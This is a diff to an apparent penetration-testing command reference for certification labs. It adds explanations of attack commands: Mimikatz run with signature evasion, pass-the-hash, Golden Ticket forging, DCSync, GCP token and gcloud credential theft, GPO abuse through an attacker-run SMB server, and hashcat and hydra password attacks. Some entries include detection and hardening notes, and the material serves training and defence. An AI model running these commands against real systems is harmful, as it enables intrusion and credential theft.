+      "explain": "First-look orientation the moment you land a shell:\n  id                       your UID/GID and group memberships\nThe variations add whoami/hostname and, critically, sudo -l (what you can run as root), plus OS/kernel (uname -a, /etc/os-release) and PATH/env - the basics that steer every next step."
     },
     {
       "type": "cheatsheet",
@@ -22700,7 +22778,8 @@ const COMMAND_DATA = {
       "mitre": [
         "T1016"
       ],
-      "exam": "exam-ok"
+      "exam": "exam-ok",
+      "explain": "Maps the host's network position for pivoting and finding new targets:\n  ip a                     list interfaces and their addresses\nThe variations cover /etc/hosts, routing (route/netstat -rn), DNS (resolv.conf), ARP neighbours (arp -a), and who is/was logged in (w/who/lastlog) - together they show what else is reachable from this box."
     },
     {
       "type": "cheatsheet",
@@ -22807,7 +22886,8 @@ const COMMAND_DATA = {
         "T1057",
         "T1518"
       ],
-      "exam": "exam-ok"
+      "exam": "exam-ok",
+      "explain": "Digs into processes, packages, and configs for escalation vectors:\n  ps aux | grep root       list processes running as root (candidates to abuse)\nThe variations enumerate installed packages/binaries (to cross-ref GTFOBins), sudo -V (version for CVEs), and config/shell-script files - where misconfigurations and creds hide."
     },
     {
       "type": "cheatsheet",
@@ -22895,7 +22975,8 @@ const COMMAND_DATA = {
       "mitre": [
         "T1087.001"
       ],
-      "exam": "exam-ok"
+      "exam": "exam-ok",
+      "explain": "Enumerates accounts and privileged group membership:\n  cat /etc/passwd          list all accounts (and, per the variations, which have login shells = attack targets)\nAlso check /etc/group and getent group sudo for membership of powerful groups (sudo/docker/lxd/disk/adm) - each maps to a specific escalation path."
     },
     {
       "type": "command",
@@ -22995,7 +23076,8 @@ const COMMAND_DATA = {
           "MITRE T1083",
           "MITRE T1543"
         ]
-      }
+      },
+      "explain": "Finds world-writable files, a prime escalation vector:\n  find /                   search from root\n  -path /proc -prune -o    skip /proc to cut noise\n  -type f -perm -o+w       files with the world-writable bit set\n  2>/dev/null              discard permission errors\nA root-run script or cron target that is world-writable lets you inject a payload; the variation finds writable directories too."
     },
     {
       "type": "command",
@@ -23586,7 +23668,8 @@ const COMMAND_DATA = {
           "label": "Evasive logonpasswords dump",
           "command": "Loader.exe -path SafetyKatz.exe -args \"sekurlsa::evasive-logonpasswords\" \"exit\""
         }
-      ]
+      ],
+      "explain": "Runs CRTP's customized SafetyKatz/Mimikatz whose commands are renamed 'evasive-' to dodge signatures, loaded in-memory via Loader.exe:\n  Loader.exe               unhook ETW/AMSI and reflectively load the assembly in-process\n  -path <safetykatz_exe>   the SafetyKatz binary to run\n  -args \"sekurlsa::evasive-keys\" \"exit\"   dump Kerberos encryption keys, then quit\nSwap the arg for evasive-logonpasswords, evasive-ekeys, evasive-pth, lsadump::evasive-dcsync, etc. Nothing signature-matchable ever hits disk or LSASS via a known-bad name."
     },
     {
       "type": "command",
@@ -23681,7 +23764,8 @@ const COMMAND_DATA = {
           "MITRE T1552.006"
         ],
         "evasion": "Read only the events you need (targeted query) rather than exporting whole logs."
-      }
+      },
+      "explain": "Abuses Event Log Readers membership to mine the Security log for passwords:\n  wevtutil qe Security     query the Security event log\n  /rd:true                 read newest events first\n  /f:text                  plain-text output\n  | Select-String \"/user\"  filter to lines containing /user\nProcess-creation events (4688) often capture command lines with plaintext passwords passed via /user - grep them out."
     },
     {
       "id": "pth-evilwinrm",
@@ -23774,7 +23858,8 @@ const COMMAND_DATA = {
           "label": "SSL + load scripts/binaries",
           "command": "evil-winrm -i <ip> -u <user> -H <nt_hash> -S -s /scripts/ -e /binaries/"
         }
-      ]
+      ],
+      "explain": "Pass-the-hash into an interactive WinRM shell:\n  evil-winrm -i <ip>       the target (WinRM 5985/5986)\n  -u <user>                the account\n  -H <nt_hash>             authenticate with its NT hash instead of a password\nThe account must be in Remote Management Users. Add -S for HTTPS and -s/-e for local script/binary directories."
     },
     {
       "id": "ad-evil-winrm",
@@ -23876,7 +23961,8 @@ const COMMAND_DATA = {
           "label": "With scripts/executables dir",
           "command": "evil-winrm -i <target> -u <user> -p <password> -s /opt/scripts -e /opt/bins"
         }
-      ]
+      ],
+      "explain": "Opens an interactive PowerShell shell over WinRM with credentials:\n  evil-winrm -i <target>   the target host (WinRM 5985/HTTP, 5986/HTTPS)\n  -u <user> -p <password>  domain or local credentials\nThe account must be in Remote Management Users/Administrators. -H <nt_hash> authenticates by hash (pass-the-hash); -s and -e set local script/binary directories for in-memory loading."
     },
     {
       "id": "exploitation-prioritization",
@@ -25246,7 +25332,8 @@ const COMMAND_DATA = {
         "secure_config": "# Firefox: enable Primary Password (master password):\n# Settings -> Privacy & Security -> Use Primary Password\n# Without this, all saved passwords are decryptable by any user-level process\n\n# Enforce encrypted protocols:\n# Replace FTP with SFTP/FTPS, HTTP with HTTPS, LDAP with LDAPS\n# STARTTLS minimum for all mail protocols\n\n# Network DLP:\n# Proxy with TLS inspection for all egress (catches cleartext and detects exfil)\n# IDS rules detecting cleartext credential patterns (FTP PASS, HTTP Basic)\n\n# Credential hunting prevention:\n# LAPS for local admin (unique per-machine passwords, not stored in shares)\n# Secrets management (Vault) instead of config file passwords\n# MDM/Intune policy: prevent 3rd-party password managers storing to cloud",
         "evasion": "Read files directly instead of staging tools; scope the search to likely directories; where a tool binary is signatured, copy the artifact off-host and process it on your box."
       },
-      "type": "command"
+      "type": "command",
+      "explain": "Recovers passwords saved in a Firefox profile:\n  python3 firefox_decrypt.py   read logins.json and decrypt it using key4.db\nList profiles under ~/.mozilla/firefox first; run against the profile (interactively prompts for the master password if one is set) to print stored site credentials in cleartext."
     },
     {
       "id": "fix-memory-corruption-exploit",
@@ -25539,7 +25626,8 @@ const COMMAND_DATA = {
           "a": "Event 4724 (attempt to reset an account's password) where the actor is not the account owner or an approved help-desk admin - especially one principal resetting several accounts, or resetting a privileged account, outside normal support workflows.",
           "role": "soc"
         }
-      ]
+      ],
+      "explain": "Resets a target user's password without knowing the current one, using the User-Force-Change-Password right (or GenericAll):\n  --host <dc_ip>            the Domain Controller\n  -d <domain>              the domain\n  -u <user> -p <password>  authenticate as the account that holds the right\n  set password <target_account> '<new_password>'   force the new password on the victim\nYou now own <target_account> - but this locks the real owner out and is loud, so prefer Shadow Credentials when you have write access."
     },
     {
       "id": "cdsa-m13-evidence-acquisition",
@@ -25747,7 +25835,8 @@ const COMMAND_DATA = {
           "label": "evasive-silver inter-realm TGT (Rubeus)",
           "command": "Rubeus.exe silver /service:krbtgt/<target_forest> /rc4:<trust_key> /sids:<target_EA_sid> /user:Administrator /domain:<domain> /ptt"
         }
-      ]
+      ],
+      "explain": "Forges an inter-realm referral TGT using the shared forest trust key to reach a trusted external forest:\n  golden /rc4:<nt_hash>     here <nt_hash> is the trust key from lsadump::trust /patch\n  /domain:<domain> /sid:<domain_sid>   your (source) domain and SID\n  /sids:<target_enterprise_admin_sid>  target forest privileged SID\n  /service:krbtgt /target:<target_domain>   forge a referral ticket toward the target realm\n  /ptt                      inject it\nThen Rubeus asktgs for a service (e.g. cifs/<dc>) in the target forest. Note: SID filtering across a forest trust usually blocks EA SIDs, so this typically yields only trust-permitted access."
     },
     {
       "id": "ad-fping-sweep",
@@ -26534,7 +26623,8 @@ const COMMAND_DATA = {
         "misconfiguration": "Default Compute Engine SA (Editor) attached with the legacy 'cloud-platform' scope on an internet-facing VM; SSRF that can set headers.",
         "vulnerable_config": "# Default SA (Editor) + broad scope + SSRF/RCE:\ncurl -H \"Metadata-Flavor: Google\" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token",
         "secure_config": "# Attach a dedicated least-privilege SA with narrow scopes (not the default Editor SA).\n# Enable metadata concealment / GKE Workload Identity; block workload egress to 169.254.169.254;\n# remediate SSRF; alert on anomalous SA API usage."
-      }
+      },
+      "explain": "Pulls a GCE VM's attached service-account token from the metadata server:\n  curl -s -H \"Metadata-Flavor: Google\"   the required metadata header\n  \"http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token\"   fetch the default SA's OAuth access token\nFrom code execution (or a header-controlling SSRF) on the VM, this returns a token to use with gcloud; Compute default SAs are often over-privileged (Editor)."
     },
     {
       "id": "gcp-stored-credentials",
@@ -26633,7 +26723,8 @@ const COMMAND_DATA = {
         "misconfiguration": "Long-lived gcloud logins/refresh tokens on shared or internet-exposed hosts; no context-aware access binding tokens to devices.",
         "vulnerable_config": "# Any local file access yields reusable creds:\ncp -r ~/.config/gcloud /tmp/exfil   # refresh tokens + ADC + legacy keys",
         "secure_config": "# Use Workload Identity Federation / attached SAs instead of persistent gcloud logins on servers/CI;\n# enable context-aware access (device/IP-bound); monitor access to the gcloud config dir;\n# revoke tokens on host compromise (gcloud auth revoke)."
-      }
+      },
+      "explain": "Harvests cached gcloud SDK credentials from a compromised host:\n  sqlite3 ~/.config/gcloud/access_tokens.db   open gcloud's token store\n  'select account_id,access_token from access_tokens;'   dump each account and its live OAuth access token\nAlso check credentials.db (refresh tokens), legacy_credentials/ (SA keys), and Application Default Credentials - any of these lets you authenticate as that principal to GCP."
     },
     {
       "id": "gcp-iam-enum",
@@ -26841,7 +26932,8 @@ const COMMAND_DATA = {
         "misconfiguration": "Non-admins granted actAs/getAccessToken over privileged SAs, serviceAccountKeys.create, iam.roles.update, or *.setIamPolicy; default Editor SAs reusable as escalation targets.",
         "vulnerable_config": "# Principal can impersonate a project-Editor SA:\ngcloud iam service-accounts get-iam-policy <priv_sa>   # shows you as roles/iam.serviceAccountTokenCreator\ngcloud storage ls --impersonate-service-account <priv_sa>",
         "secure_config": "# Remove actAs/getAccessToken/keys.create/roles.update/setIamPolicy from non-admin roles;\n# use IAM Recommender + Policy Analyzer to prune escalation paths; disable SA key creation via org policy;\n# alert on GenerateAccessToken/CreateServiceAccountKey/UpdateRole/SetIamPolicy in audit logs."
-      }
+      },
+      "explain": "Escalates a low-priv GCP identity by abusing dangerous IAM permissions:\n  python3 check_for_privesc.py   enumerate your permissions and flag exploitable ones\nLooks for rights like iam.roles.update, iam.serviceAccounts.getAccessToken/actAs, serviceAccountKeys.create, and setIamPolicy - each lets you grant yourself more or impersonate a higher-privileged service account. gcp_enum.sh does broader enumeration."
     },
     {
       "id": "gcp-sa-key-persistence",
@@ -26932,7 +27024,8 @@ const COMMAND_DATA = {
         "misconfiguration": "SA key creation allowed (no org policy) and key-create permission granted broadly; privileged SAs whose keys anyone with Editor can mint.",
         "vulnerable_config": "# Any Editor on the project can mint a key for a privileged SA:\ngcloud iam service-accounts keys create bd.json --iam-account <priv_sa>   # long-lived backdoor",
         "secure_config": "# Org policy: constraints/iam.disableServiceAccountKeyCreation = true\n# Use Workload Identity Federation / short-lived impersonation; restrict Key Admin;\n# alert on CreateServiceAccountKey; inventory + rotate keys."
-      }
+      },
+      "explain": "Creates a long-lived JSON key for a service account you can manage - stealthy GCP persistence:\n  gcloud iam service-accounts keys create key.json   generate a new key and save it locally\n  --iam-account <sa_email>   the service account to mint the key for\nRequires iam.serviceAccountKeys.create. The downloaded key authenticates as the SA indefinitely, is MFA-independent, and survives user password resets - activate it later with gcloud auth activate-service-account."
     },
     {
       "id": "ad-genericall-group",
@@ -27035,7 +27128,8 @@ const COMMAND_DATA = {
           "a": "4728/4732/4756 (member added to a security group) and 5136 on the member attribute. Separate malicious from routine by the actor (not a normal group admin), timing, and correlation with prior recon or a fresh logon by the added principal.",
           "role": "soc"
         }
-      ]
+      ],
+      "explain": "Adds a principal you control into a group you have GenericAll/GenericWrite/AddMember over, inheriting the group's rights:\n  --host <dc_ip>            the Domain Controller\n  -d <domain>              the domain\n  -u <user> -p <password>  authenticate as the account holding the write right\n  add groupMember \"<target_group>\" <user>   put <user> into <target_group>\nRe-authenticate (new ticket) afterward so the added membership appears in your Kerberos PAC and the inherited privileges take effect."
     },
     {
       "id": "cdsa-get-winevent",
@@ -27334,7 +27428,8 @@ const COMMAND_DATA = {
           "label": "From an AS-REP key",
           "command": "python /opt/PKINITtools/getnthash.py -key <as_rep_key> <domain>/<user>"
         }
-      ]
+      ],
+      "explain": "Recovers an NT hash from a PKINIT TGT's session key (step 2 after gettgtpkinit.py):\n  getnthash.py             derive the account's NT hash from Kerberos material\n  -key <as_rep_key>        the AS-REP encryption key printed by gettgtpkinit.py\n  <domain>/<dc_host>$      the account the TGT belongs to (here the DC machine account)\nThe recovered NT hash enables pass-the-hash DCSync without needing the ccache directly."
     },
     {
       "id": "ad-pkinit-gettgt",
@@ -27433,7 +27528,8 @@ const COMMAND_DATA = {
           "label": "Extract the NT hash from the TGT",
           "command": "export KRB5CCNAME=user.ccache; python /opt/PKINITtools/getnthash.py -key <as_rep_key> <domain>/<user>"
         }
-      ]
+      ],
+      "explain": "Requests a TGT for the DC machine account using a captured ADCS certificate (PKINIT):\n  gettgtpkinit.py          PKINITtools TGT requester\n  -pfx-base64 <base64_cert>   the relayed certificate, base64-encoded\n  <domain>/<dc_host>$      the DC machine account the cert is for\n  <output>.ccache          output ticket cache\nThe DC machine account has replication rights, so this TGT enables DCSync (or getnthash to recover its NT hash). Part of the PetitPotam chain."
     },
     {
       "id": "ad-crossforest-kerberoast",
@@ -27540,7 +27636,8 @@ const COMMAND_DATA = {
           "label": "Crack offline",
           "command": "hashcat -m 13100 xf.txt /usr/share/wordlists/rockyou.txt"
         }
-      ]
+      ],
+      "explain": "Kerberoasts a trusted foreign forest using your local-forest credentials:\n  GetUserSPNs.py           request TGS tickets for SPN accounts\n  -request                 actually request the tickets (not just list)\n  -target-domain <foreign_domain>   the trusted domain whose service accounts you roast\n  <domain>/<user>:<password>   your local-forest credentials\nWith a bidirectional trust the foreign DC issues TGS tickets encrypted with the foreign account's key; crack them offline (hashcat -m 13100)."
     },
     {
       "type": "payload",
@@ -27955,7 +28052,8 @@ const COMMAND_DATA = {
           "label": "Save to file for later",
           "command": "Rubeus.exe golden /rc4:<nt_hash> /domain:<domain> /sid:<domain_sid> /user:Administrator /outfile:golden.kirbi"
         }
-      ]
+      ],
+      "explain": "Forges a Golden Ticket - a TGT signed with the domain's krbtgt key - for persistent, arbitrary-user domain access:\n  golden                    forge a TGT offline\n  /rc4:<nt_hash>           the krbtgt NTLM hash (use /aes256 to be stealthier)\n  /domain:<domain> /sid:<domain_sid>   the domain and its SID\n  /user:Administrator      the identity to impersonate\n  /ptt                      inject the ticket into this session\nSince it is signed with krbtgt, the KDC honors it for any service; access the DC (dir \\\\<dc>\\C$). /ldap /printcmd auto-fills real PAC values for opsec."
     },
     {
       "id": "crtp-gpo-abuse",
@@ -28054,7 +28152,8 @@ const COMMAND_DATA = {
           "label": "Abuse via GPOddity (Linux/WSL, lab method)",
           "command": "sudo python3 gpoddity.py --gpo-id '<gpo_id>' --domain '<domain>' --username '<user>' --password '<pass>' --command 'net localgroup administrators <user> /add' --rogue-smbserver-ip '<attacker_ip>' --rogue-smbserver-share '<share>' --dc-ip '<dc_ip>' --smb-mode none"
         }
-      ]
+      ],
+      "explain": "Finds GPOs you can modify, so you can push code to every computer in the linked OU:\n  Get-DomainGPO             list all GPOs\n  | Get-DomainObjectAcl -ResolveGUIDs   read each GPO's ACL with readable right names\n  | ? {$_.ActiveDirectoryRights -match 'CreateChild|WriteProperty|GenericAll'}   keep only GPOs you can edit\nOn a writable GPO, SharpGPOAbuse --AddComputerTask adds a SYSTEM scheduled task (e.g. add yourself to local admins); gpupdate /force applies it."
     },
     {
       "id": "cdsa-m06-gpp-passwords",
@@ -28148,7 +28247,8 @@ const COMMAND_DATA = {
           "label": "Get-WinEvent to monitor 4663 (file access) on DC",
           "command": "Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4663} | Where-Object {$_.Message -like '*Groups.xml*'} | Format-List"
         }
-      ]
+      ],
+      "explain": "Recovers Group Policy Preferences passwords stored in SYSVOL and encrypted with Microsoft's public AES key:\n  Import-Module .\\Get-GPPPassword.ps1   load the PowerSploit function\n  Get-GPPPassword          find cpassword values in SYSVOL GPP XML and decrypt them\nAny authenticated user can read SYSVOL, so any user recovers these creds (patched by KB2962486 in 2014, but legacy XML lingers). Manually: findstr /s /i \"cpassword\" over \\\\<domain>\\SYSVOL."
     },
     {
       "id": "ad-gpp-decrypt",
@@ -28255,7 +28355,8 @@ const COMMAND_DATA = {
           "label": "Decrypt it (AES key is public)",
           "command": "gpp-decrypt <cpassword>"
         }
-      ]
+      ],
+      "explain": "Decrypts a Group Policy Preferences cpassword using Microsoft's published AES key:\n  gpp-decrypt              apply the public GPP AES key (KB2962486)\n  <cpassword>              the base64 cpassword string from a SYSVOL GPP XML (Groups.xml, Services.xml, etc.)\nMicrosoft published the key in 2012, so every GPP-stored password is trivially recoverable. Find the cpassword first with findstr/grep over SYSVOL."
     },
     {
       "id": "graphql-mutations",
@@ -29289,7 +29390,8 @@ const COMMAND_DATA = {
       "mitre": [
         "T1110.002"
       ],
-      "exam": "exam-ok"
+      "exam": "exam-ok",
+      "explain": "A reference for hashcat's attack modes and mask charsets, shown via a mask brute-force:\n  hashcat -a 3             attack mode 3 = brute-force / mask\n  -m <mode>                the hash algorithm\n  <hash>                   the target hash\n  '?u?l?l?l?l?d?s'         a mask (one uppercase, four lowercase, a digit, a symbol)\nThe card lists all -a modes (0 straight, 1 combination, 6/7 hybrid) and the built-in charsets (?l ?u ?d ?s ?a), plus custom charsets (-1..-4) for policy-aware cracking."
     },
     {
       "platform": "linux",
@@ -29366,7 +29468,8 @@ const COMMAND_DATA = {
       "exam": "exam-ok",
       "mitre": [
         "T1110.002"
-      ]
+      ],
+      "explain": "A quick reference of the hashcat -m mode numbers seen most in CPTS labs:\n  hashcat -m <mode>        the algorithm to crack as\n  hashes.txt /usr/share/wordlists/rockyou.txt   the hashes and wordlist\nIdentify the hash first (hashid / name-that-hash), then plug in the mode: 1000 NTLM, 13100 Kerberoast, 18200 AS-REP, 1800 sha512crypt, 3200 bcrypt, 13400 KeePass, etc. Saves grepping --help mid-engagement."
     },
     {
       "id": "ad-asrep-crack",
@@ -29466,7 +29569,8 @@ const COMMAND_DATA = {
           "label": "Show cracked",
           "command": "hashcat -m 18200 <hashfile> --show"
         }
-      ]
+      ],
+      "explain": "Cracks AS-REP roast hashes offline to recover the account's plaintext password:\n  hashcat                  the cracker\n  -m 18200                 mode 18200 = Kerberos 5 AS-REP etype 23 ($krb5asrep$)\n  <hashfile>               the GetNPUsers/Rubeus output\n  /usr/share/wordlists/rockyou.txt   the wordlist\nThe DC encrypted the AS-REP with the account's NT-hash-derived key, so a match reveals the password. Add --show to reprint cracked results."
     },
     {
       "id": "ad-kerberoast-crack",
@@ -29586,7 +29690,8 @@ const COMMAND_DATA = {
           "label": "Show cracked",
           "command": "hashcat -m 13100 <hashfile> --show"
         }
-      ]
+      ],
+      "explain": "Cracks Kerberoast TGS-REP hashes offline:\n  hashcat -m 13100         mode 13100 = RC4-encrypted TGS (etype 23, fast)\n  <hashfile>               the roasted hashes\n  /usr/share/wordlists/rockyou.txt   the wordlist\nUse -m 19700 for AES256 tickets (etype 18, much slower). Recovers the service account's plaintext with no lockout or network traffic; add -r best64.rule to expand coverage."
     },
     {
       "id": "ad-responder-crack",
@@ -29686,7 +29791,8 @@ const COMMAND_DATA = {
           "label": "John",
           "command": "john --format=netntlmv2 <hashfile>"
         }
-      ]
+      ],
+      "explain": "Cracks captured NetNTLMv2 hashes offline:\n  hashcat -m 5600          mode 5600 = NetNTLMv2\n  <hashfile>               the Responder/Inveigh capture\n  /usr/share/wordlists/rockyou.txt   the wordlist\nNetNTLMv2 cannot be used for pass-the-hash, so cracking (or relaying) is the only way to leverage it; a GPU speeds this up considerably."
     },
     {
       "id": "hashcat-windows-hashes",
@@ -29778,7 +29884,8 @@ const COMMAND_DATA = {
         "sentinel_kql": "DeviceProcessEvents\n| where FileName startswith \"hashcat\"\n| where ProcessCommandLine has \"-m 1000\" or ProcessCommandLine has \"-m 1000 \"\n| project Timestamp, DeviceName, AccountName, ProcessCommandLine\n| sort by Timestamp desc\n// offline NTLM cracking on attacker host; detect the preceding hash-dump that produced <hash_file>",
         "sigma_rules": "proc_creation_lnx_hashcat_execution (offline NTLM mode 1000 cracking - low endpoint signal)"
       },
-      "type": "command"
+      "type": "command",
+      "explain": "Cracks Windows credential hashes offline with hashcat:\n  -m 1000                  mode 1000 = NT (NTLM) hashes from SAM/NTDS (unsalted, fast)\n  <hash_file>              the extracted hashes\n  /usr/share/wordlists/rockyou.txt   the wordlist\nUse -m 2100 instead for DCC2 cached domain credentials (deliberately slow). A recovered plaintext lets you authenticate normally instead of relaying a hash."
     },
     {
       "id": "hashcat-dictionary",
@@ -29886,7 +29993,8 @@ const COMMAND_DATA = {
         "sentinel_kql": "DeviceProcessEvents\n| where FileName startswith \"hashcat\" and ProcessCommandLine has \"-a 0\"\n| project Timestamp, DeviceName, AccountName, ProcessCommandLine\n| sort by Timestamp desc\n// offline dictionary attack; no victim signal - focus on preventing the hash dump",
         "sigma_rules": "proc_creation_hashcat_offline_cracking (no target-side telemetry - detect the preceding hash theft)"
       },
-      "type": "command"
+      "type": "command",
+      "explain": "Runs a straight dictionary attack with hashcat:\n  hashcat -a 0             attack mode 0 = straight (hash each wordlist entry and compare)\n  -m <mode>                the hash algorithm number\n  <hash>                   the target hash\n  /usr/share/wordlists/rockyou.txt   the wordlist\nAdd -r <rule_file> (e.g. best64.rule) to mutate each candidate, greatly expanding coverage at little cost."
     },
     {
       "id": "hashcat-mutate",
@@ -29973,7 +30081,8 @@ const COMMAND_DATA = {
           "label": "Combine multiple rule files",
           "command": "hashcat -a 0 -m <mode> <hash> <wordlist> -r /usr/share/hashcat/rules/best64.rule -r /usr/share/hashcat/rules/toggles1.rule"
         }
-      ]
+      ],
+      "explain": "Uses the hashcat rule engine to PRINT (not crack) a mutated wordlist:\n  hashcat --force <wordlist>   run over the list\n  -r <rule_file>           apply these mutation rules\n  --stdout                 output the mutated candidates instead of cracking\n  | sort -u > mutated.list   dedupe into a new expanded list\nHandy to pre-generate a policy-aware list for reuse; the variation stacks multiple rule files."
     },
     {
       "id": "hashcat-hash-modes",
@@ -30061,7 +30170,8 @@ const COMMAND_DATA = {
       "mitre": [
         "T1110.002"
       ],
-      "exam": "exam-ok"
+      "exam": "exam-ok",
+      "explain": "A reference of hashcat -m mode numbers by hash type:\n  hashcat -a 0 -m <mode>   straight attack; <mode> tells hashcat which algorithm the hash is\n  <hash_file> /usr/share/wordlists/rockyou.txt   the hashes and wordlist\nGetting the mode wrong makes cracking silently fail, so identify the hash (hashid) first, then match: 1000 NTLM, 1800 sha512crypt, 13100 Kerberoast, 5600 NetNTLMv2, 13400 KeePass, etc."
     },
     {
       "id": "hashcat-mask",
@@ -30151,7 +30261,8 @@ const COMMAND_DATA = {
           "label": "Incremental length",
           "command": "hashcat -a 3 -m <mode> <hashfile> '?a?a?a?a?a?a' --increment --increment-min 4 --increment-max 6"
         }
-      ]
+      ],
+      "explain": "Brute-forces against a mask that models a known password pattern:\n  hashcat -a 3             attack mode 3 = mask\n  -m <mode>                the hash algorithm\n  <hashfile>               the target hashes\n  'Autumn?d?d?d?d!'        the mask: literal 'Autumn', four digits, literal '!'\nFar faster than blind brute force when the policy or habit is known; -1/-2 define custom charsets, --increment varies the length."
     },
     {
       "id": "hashcat-rule-functions",
@@ -30240,7 +30351,8 @@ const COMMAND_DATA = {
       "mitre": [
         "T1110.002"
       ],
-      "exam": "exam-ok"
+      "exam": "exam-ok",
+      "explain": "A reference for hashcat rules, which mutate each wordlist candidate on the fly:\n  hashcat -a 0 -m <mode>   straight dictionary attack\n  <hash> <wordlist>        the target and base list\n  -r <rule_file>           apply this rule file to every candidate (capitalize, leetspeak, append digits/symbols)\nOne base list then covers many realistic variants; the card lists common functions (c, sXY, $X, ^X) and the bundled rules (best64, dive, leetspeak)."
     },
     {
       "id": "hashid-identify",
@@ -30339,7 +30451,8 @@ const COMMAND_DATA = {
           "label": "From a file, hashcat+JtR+extended",
           "command": "hashid -mje hashes.txt"
         }
-      ]
+      ],
+      "explain": "Identifies an unknown hash and prints its hashcat mode:\n  hashid                   the identifier\n  -m                       also print the matching Hashcat mode number\n  '<hash>'                 the hash to analyze\nUse the printed mode with hashcat -m; -j shows the John format, -mje reads a file and shows both plus extended info. Always confirm the mode before a long crack."
     },
     {
       "type": "command",
@@ -30459,7 +30572,8 @@ const COMMAND_DATA = {
           "label": "Extract local hashes offline",
           "command": "impacket-secretsdump -sam SAM -system SYSTEM LOCAL"
         }
-      ]
+      ],
+      "explain": "Exploits SeriousSAM/HiveNightmare (CVE-2021-36934) - non-admins can read the SAM via shadow copies:\n  icacls c:\\Windows\\System32\\config\\SAM   check whether the SAM's ACL grants read to non-admins (confirms vulnerability)\nIf so, copy SAM/SYSTEM/SECURITY from a \\\\?\\GLOBALROOT shadow copy (readable even though the live files are locked) and run impacket-secretsdump -sam -system LOCAL to extract local hashes."
     },
     {
       "type": "command",
@@ -31543,7 +31657,8 @@ const COMMAND_DATA = {
         "vulnerable_config": "# Weak domain password policy:\nGet-ADDefaultDomainPasswordPolicy\n# MinPasswordLength:    8    <-- too short\n# PasswordHistoryCount: 0    <-- no history, password reuse allowed\n# ComplexityEnabled:    False <-- no complexity\n# LockoutThreshold:     0    <-- NO lockout\n\n# Local SAM policy (workgroup machines):\n# Control Panel -> Local Security Policy -> Account Policies -> Password Policy\n# Same weak defaults as above",
         "secure_config": "# Set a strong domain password policy:\nSet-ADDefaultDomainPasswordPolicy -Identity corp.local \\\n    -MinPasswordLength 14 \\\n    -PasswordHistoryCount 24 \\\n    -ComplexityEnabled $true \\\n    -MaxPasswordAge 90.00:00:00 \\\n    -LockoutThreshold 5 \\\n    -LockoutDuration 00:30:00 \\\n    -LockoutObservationWindow 00:30:00\n\n# Fine-Grained PSO for privileged accounts (stricter):\nNew-ADFineGrainedPasswordPolicy -Name PrivilegedPSO \\\n    -MinPasswordLength 20 -PasswordHistoryCount 48 \\\n    -ComplexityEnabled $true -LockoutThreshold 3 \\\n    -LockoutDuration 01:00:00 -Precedence 1\nAdd-ADFineGrainedPasswordPolicySubject PrivilegedPSO -Subjects 'Domain Admins'\n\n# Deploy Azure AD Password Protection (blocks common passwords on-prem too)\n# Enable Microsoft Entra ID Smart Lockout"
       },
-      "type": "command"
+      "type": "command",
+      "explain": "Online brute-force against a network service:\n  hydra                    the online cracker\n  -L <userlist>            usernames to try (-l for a single user)\n  -P <wordlist>            passwords to try (-p for a single password)\n  <proto>://<ip>           the service and target (ssh, rdp, smb, ...)\nAdd -t to cap parallel tasks and avoid lockouts; -C uses a combined user:pass file instead of a cross product."
     },
     {
       "id": "hydra-cred-stuffing",
@@ -31635,7 +31750,8 @@ const COMMAND_DATA = {
           "label": "Single service, user:pass list",
           "command": "hydra -C <userpass_list> <service>://<ip>"
         }
-      ]
+      ],
+      "explain": "Replays known user:password pairs against a service (credential stuffing):\n  hydra                    the online cracker\n  -C <userpass_list>       a combined file of user:pass pairs - test each pair as-is, not every combination\n  ssh://<ip>               the service and target\nUse to replay credentials leaked or found elsewhere; the variation shows the http-post-form syntax for web login forms."
     },
     {
       "id": "hydra-http-basic",
@@ -31953,7 +32069,8 @@ const COMMAND_DATA = {
           "MITRE T1611"
         ],
         "evasion": "Use the symlink/takeown path once to grab the target file, then restore ownership/permissions."
-      }
+      },
+      "explain": "Abuses Hyper-V Administrators (effectively SYSTEM file access) by hijacking a SYSTEM-run service binary:\n  takeown /F \"C:\\Program Files (x86)\\Mozilla Maintenance Service\\maintenanceservice.exe\"   take ownership of the service executable\nThen grant yourself write, replace the binary with a payload, and start the service so it runs as SYSTEM. CVE-2018-0952/CVE-2019-0841 symlink abuse is the underlying primitive."
     },
     {
       "type": "script",
@@ -32967,7 +33084,8 @@ const COMMAND_DATA = {
           "label": "Only krbtgt",
           "command": "impacket-secretsdump -k -no-pass -just-dc-user krbtgt -dc-ip <dc_ip> <domain>/<user>@<dc_fqdn>"
         }
-      ]
+      ],
+      "explain": "DCSyncs an account's hashes using a Kerberos ticket (pass-the-certificate/ticket path):\n  impacket-secretsdump     the secrets dumper\n  -k -no-pass              authenticate with the ticket in KRB5CCNAME, no password\n  -dc-ip <dc_ip>           the DC to replicate from\n  -just-dc-user <target>   only pull this account's secrets (e.g. Administrator or krbtgt)\n  '<domain>/<account>'@<dc_fqdn>   the principal the ticket is for (often a machine account like DC01$)\nA machine-account TGT typically has replication rights, so this yields the Administrator/krbtgt NT hash."
     },
     {
       "id": "secretsdump-offline",
@@ -33081,7 +33199,8 @@ const COMMAND_DATA = {
           "label": "Extract secrets offline",
           "command": "impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL"
         }
-      ]
+      ],
+      "explain": "Decrypts saved SAM/SECURITY/SYSTEM hives offline to recover local secrets:\n  impacket-secretsdump     the parser\n  -sam sam.save            local account NT hashes\n  -security security.save  LSA secrets and cached domain credentials (DCC2)\n  -system system.save      the boot key that decrypts the above\n  LOCAL                    operate on the files, not over the network\nCrack NT hashes with hashcat -m 1000 and DCC2 with -m 2100; the same tool also does remote DCSync with -just-dc."
     },
     {
       "id": "secretsdump-ntds",
@@ -33177,7 +33296,8 @@ const COMMAND_DATA = {
         "vulnerable_config": "# Windows Credential Manager stores cleartext/encrypted creds:\ncmdkey /list\n# Manages: Domain:interactive=CORP\\svcaccount  (recoverable with DPAPI)\n\n# /etc/shadow accessible (bad permissions):\nls -la /etc/shadow  # -rw-r--r-- 1 root shadow (group-readable)\n# SHA-512 hashes: crackable with hashcat -m 1800",
